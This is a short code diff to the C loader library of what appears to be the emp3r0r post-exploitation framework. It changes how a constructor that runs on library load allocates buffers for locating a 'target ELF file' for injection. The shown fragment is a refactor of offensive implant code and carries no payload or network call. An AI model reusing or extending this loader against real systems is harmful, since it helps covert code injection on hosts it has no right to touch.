@@ -4,7 +4,6 @@
 #include <dlfcn.h>
 #include <errno.h>
 #include <fcntl.h>
-#include <libgen.h>
 #include <signal.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -176,13 +175,13 @@ void __attribute__((constructor)) initLibrary(void) {
 
   // where to read target ELF file
   // this should be in sync with emp3r0r inject_loader module
-  char exe[1024];
+  char *exe = calloc(1024, sizeof(char));
   if (readlink("/proc/self/exe", exe, 1024) < 0) {
     perror("readlink");
     return;
   }
   const char *exe_name = basename(exe);
-  char elf_path[1024]; // path to target ELF file
+  char *elf_path = calloc(1024, sizeof(char)); // path to target ELF file
   const char *cwd = getcwd(NULL, 0);
   // decides where to get target ELF binary
   if (getuid() == 0) {
